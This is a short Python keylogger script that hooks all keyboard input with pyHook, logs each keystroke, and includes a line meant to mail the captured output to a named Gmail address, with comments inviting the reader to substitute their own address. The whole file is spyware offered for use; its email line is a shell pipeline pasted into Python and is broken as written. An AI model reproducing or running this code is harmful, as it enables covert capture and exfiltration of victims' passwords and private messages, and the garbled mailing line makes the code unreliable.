import pyHook, pythoncom, sys, logging
# feel free to set the file_log to a different file name/location

email_send = python pyspy.pyw | mail -s outputFromScript theblackvaultufofootage@gmail.com # or whatever email you want

def OnKeyboardEvent(event):
    logging.basicConfig(filename=email_send, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()